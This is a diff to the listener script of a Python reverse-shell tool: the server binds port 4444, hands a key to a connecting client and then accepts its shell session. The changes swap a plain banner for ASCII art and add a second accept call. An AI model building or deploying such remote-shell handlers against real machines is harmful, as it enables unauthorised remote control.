@@ -52,8 +52,16 @@ server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind(('0.0.0.0', 4444))
 server.listen(2)
 server.settimeout(60)
-print('=' * 18, "\nSecure Reverse-Shell Version: 1.0\n Up-to-date GitHub link: github.com/Fsock-hub/secure-reverse-shell")
-print('=' * 18)
+print('''
+ ____________________________________________________________________________________________________________
+|.d88b.                                888b.                                         .d88b. 8           8 8  |
+|YPwww. .d88b .d8b 8   8 8d8b .d88b    8  .8 .d88b Yb  dP .d88b 8d8b d88b .d88b      YPwww. 8d8b. .d88b 8 8  |
+|    d8 8.dP' 8    8b d8 8P   8.dP'    8wwK' 8.dP'  YbdP  8.dP' 8P   `Yb. 8.dP' wwww     d8 8P Y8 8.dP' 8 8  |
+|`Y88P' `Y88P `Y8P `Y8P8 8    `Y88P    8  Yb `Y88P   YP   `Y88P 8    Y88P `Y88P      `Y88P' 8   8 `Y88P 8 8  |
+|____________________________________________________________________________________________________________|
+   | [Version 1.0] |                                                                                     
+''')
+print(r'[*] Up to-date github link: https://github.com/Fsock-hub/secure-reverse-shell')
 print('[*] Wait connection...')
 
 try:
@@ -61,13 +69,12 @@ try:
     raw = conn.recv(1024)
 
     if raw == b'REQUEST_KEY':
-
         send_key(conn, KEY)
         ack = conn.recv(1024)
-
+        
         if ack == b'KEY_RECEIVED':
             print('[+] Key sent to client')
-
+            
         conn.close()
         conn, addr = server.accept()
         print(f'[+] Connection by {addr}')
@@ -84,6 +91,9 @@ try:
         server.close()
         input('[*] Press Enter to exit...')
         exit()
+
+    conn, addr = server.accept()
+    print(f'[+] Connection by {addr}')
 
     while True:
 
